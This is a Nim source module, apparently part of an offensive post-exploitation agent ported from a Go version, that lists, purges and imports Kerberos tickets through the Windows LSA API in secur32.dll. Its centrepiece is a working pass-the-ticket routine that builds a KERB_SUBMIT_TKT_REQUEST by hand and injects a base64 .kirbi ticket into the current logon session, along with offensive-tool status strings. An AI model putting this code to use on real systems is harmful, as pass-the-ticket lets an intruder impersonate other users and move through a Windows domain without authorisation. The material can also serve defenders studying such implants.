## Kerberos ticket operations via the LSA API (secur32.dll).
## Mirrors kerberos_windows.go from the Go agent.
## Implements KERB_LIST (list tickets), KERB_PTT (pass-the-ticket), KERB_PURGE.

import winim/lean
import std/[base64, osproc, strformat, strutils]

# ─────────────────────────────────────────────────────────────────────────────
# LSA function pointer types (secur32.dll)
# ─────────────────────────────────────────────────────────────────────────────
type
  FnLsaConnect = proc(handle: ptr HANDLE): NTSTATUS {.stdcall.}
  FnLsaLookup  = proc(handle: HANDLE; name: pointer;
                       pkg: ptr ULONG): NTSTATUS {.stdcall.}
  FnLsaCall    = proc(handle: HANDLE; pkg: ULONG;
                       inBuf: pointer; inLen: ULONG;
                       outBuf: ptr pointer; outLen: ptr ULONG;
                       protStat: ptr NTSTATUS): NTSTATUS {.stdcall.}
  FnLsaFree    = proc(buf: pointer): NTSTATUS {.stdcall.}

# ─────────────────────────────────────────────────────────────────────────────
# kerbSetup: load secur32.dll, open LSA connection, resolve Kerberos package ID.
# Also retrieves fnCall and fnFree pointers.
# Mirrors kerbConnect() from kerberos_windows.go.
# ─────────────────────────────────────────────────────────────────────────────
proc kerbSetup(handle: var HANDLE; pkgId: var ULONG;
               fnCall: var FnLsaCall; fnFree: var FnLsaFree): bool =
  let secur32 = LoadLibraryA("secur32.dll")
  if secur32 == 0: return false

  let fnConnect = cast[FnLsaConnect](GetProcAddress(secur32, "LsaConnectUntrusted"))
  let fnLookup  = cast[FnLsaLookup](GetProcAddress(secur32, "LsaLookupAuthenticationPackage"))
  fnCall = cast[FnLsaCall](GetProcAddress(secur32, "LsaCallAuthenticationPackage"))
  fnFree = cast[FnLsaFree](GetProcAddress(secur32, "LsaFreeReturnBuffer"))

  if fnConnect == nil or fnLookup == nil or fnCall == nil: return false
  if fnConnect(addr handle) != 0: return false

  # Build an LSA_STRING (ANSI, not Unicode) pointing to "Kerberos".
  # x64 layout: Length(2) + MaximumLength(2) + pad(4) + Buffer*(8) = 16 bytes.
  let name = "Kerberos"
  var lsaStr: array[16, byte]
  cast[ptr uint16](addr lsaStr[0])[] = uint16(name.len)
  cast[ptr uint16](addr lsaStr[2])[] = uint16(name.len + 1)
  cast[ptr uint64](addr lsaStr[8])[] = cast[uint64](unsafeAddr name[0])

  result = fnLookup(handle, addr lsaStr[0], addr pkgId) == 0

# ─────────────────────────────────────────────────────────────────────────────
# Public procs
# ─────────────────────────────────────────────────────────────────────────────

proc kerberosListTickets*(): string =
  ## List cached Kerberos tickets for the current logon session.
  ## Runs klist.exe first (present on all modern Windows); falls back to a raw
  ## LSA ticket-count query if klist is unavailable or exits non-zero.
  try:
    let (output, code) = execCmdEx("cmd.exe /s /c \"klist 2>&1\"")
    if code == 0:
      return output
    # klist exited non-zero (no tickets or other error) — fall through to LSA.
  except: discard

  # LSA fallback: query ticket count via KerbQueryTicketCacheExMessage (14).
  var handle: HANDLE = 0
  var pkgId:  ULONG  = 0
  var fnCall: FnLsaCall
  var fnFree: FnLsaFree
  if not kerbSetup(handle, pkgId, fnCall, fnFree):
    return "[error: LsaConnectUntrusted failed (klist also unavailable)]"

  # KERB_QUERY_TKT_CACHE_EX_REQUEST: MessageType(4) + LogonId(8) = 12 bytes.
  var req: array[12, byte]
  cast[ptr uint32](addr req[0])[] = 14'u32  # KerbQueryTicketCacheExMessage

  var respPtr:    pointer  = nil
  var respLen:    ULONG    = 0
  var protStatus: NTSTATUS = 0

  discard fnCall(handle, pkgId,
                 addr req[0], ULONG(req.len),
                 addr respPtr, addr respLen, addr protStatus)

  if respPtr != nil:
    # KERB_QUERY_TKT_CACHE_EX_RESPONSE: MessageType(4) then CountOfTickets(4).
    let count = cast[ptr uint32](cast[int](respPtr) + 4)[]
    if fnFree != nil: discard fnFree(respPtr)
    return "Kerberos ticket cache: " & $count & " ticket(s) (klist unavailable)"

  return "[error: klist unavailable; LSA query returned no data]"


proc kerberosPassTheTicket*(b64ticket: string): string =
  ## Import a base64-encoded .kirbi ticket into the current logon session via LSA.
  ## Mirrors kerberosPassTheTicket() from kerberos_windows.go.
  ##
  ## KERB_SUBMIT_TKT_REQUEST layout on x64 (KERB_CRYPTO_KEY32, all 4-byte fields):
  ##   +0   MessageType  = 21 (KerbSubmitTicketMessage)
  ##   +4   LogonId.LowPart  (0 = current session)
  ##   +8   LogonId.HighPart (0)
  ##   +12  Flags            (0)
  ##   +16  Key32.KeyType    (0)
  ##   +20  Key32.Length     (0)
  ##   +24  Key32.Offset     (0)
  ##   +28  KerbCredSize     = len(ticket)
  ##   +32  KerbCredOffset   = 36 (== headerSize)
  ##   +36  <raw .kirbi bytes>
  var ticketBytes: seq[byte]
  try:
    ticketBytes = cast[seq[byte]](decode(b64ticket))
  except:
    return "[error: base64 decode: " & getCurrentExceptionMsg() & "]"
  if ticketBytes.len == 0:
    return "[error: empty ticket]"

  var handle: HANDLE = 0
  var pkgId:  ULONG  = 0
  var fnCall: FnLsaCall
  var fnFree: FnLsaFree
  if not kerbSetup(handle, pkgId, fnCall, fnFree):
    return "[error: LsaConnectUntrusted failed]"

  const headerSize = 36
  var reqBuf = newSeq[byte](headerSize + ticketBytes.len)
  cast[ptr uint32](unsafeAddr reqBuf[0])[]  = 21'u32                   # KerbSubmitTicketMessage
  cast[ptr uint32](unsafeAddr reqBuf[28])[] = uint32(ticketBytes.len)  # KerbCredSize
  cast[ptr uint32](unsafeAddr reqBuf[32])[] = uint32(headerSize)       # KerbCredOffset
  copyMem(unsafeAddr reqBuf[headerSize], unsafeAddr ticketBytes[0], ticketBytes.len)

  var respPtr:    pointer  = nil
  var respLen:    ULONG    = 0
  var protStatus: NTSTATUS = 0

  let r = fnCall(handle, pkgId,
                 unsafeAddr reqBuf[0], ULONG(reqBuf.len),
                 addr respPtr, addr respLen, addr protStatus)

  if respPtr != nil and fnFree != nil: discard fnFree(respPtr)

  if r != 0 or protStatus != 0:
    return fmt"[error: PTT failed NTSTATUS=0x{uint32(r):08X} protocolStatus=0x{uint32(protStatus):08X}]"
  return "[+] ticket submitted successfully"


proc kerberosPurge*(): string =
  ## Purge all Kerberos tickets for the current logon session via LSA.
  ## Mirrors kerberosPurge() from kerberos_windows.go.
  ##
  ## KERB_PURGE_TKT_CACHE_REQUEST layout on x64 (total 48 bytes):
  ##   +0   MessageType = 6 (KerbPurgeTicketCacheMessage)
  ##   +4   LogonId.LowPart  (0 = current session)
  ##   +8   LogonId.HighPart (0)
  ##   +12  padding (align UNICODE_STRING to 8 bytes)
  ##   +16  ServerName.Length (0 = all servers)
  ##   +18  ServerName.MaxLen
  ##   +20  ServerName.padding
  ##   +24  ServerName.Buffer (nil)
  ##   +32  RealmName.Length (0 = all realms)
  ##   +34  RealmName.MaxLen
  ##   +36  RealmName.padding
  ##   +40  RealmName.Buffer (nil)
  var handle: HANDLE = 0
  var pkgId:  ULONG  = 0
  var fnCall: FnLsaCall
  var fnFree: FnLsaFree
  if not kerbSetup(handle, pkgId, fnCall, fnFree):
    return "[error: LsaConnectUntrusted failed]"

  var req: array[48, byte]
  cast[ptr uint32](addr req[0])[] = 6'u32  # KerbPurgeTicketCacheMessage
  # Remaining fields stay zero: LogonId=current session, ServerName/RealmName
  # with empty lengths/nil buffers — purge all tickets in all server/realm caches.

  var respPtr:    pointer  = nil
  var respLen:    ULONG    = 0
  var protStatus: NTSTATUS = 0

  discard fnCall(handle, pkgId,
                 addr req[0], ULONG(req.len),
                 addr respPtr, addr respLen, addr protStatus)

  if respPtr != nil and fnFree != nil: discard fnFree(respPtr)

  if protStatus != 0:
    return fmt"[error: purge NTSTATUS=0x{uint32(protStatus):08X}]"
  return "[+] Kerberos ticket cache purged"
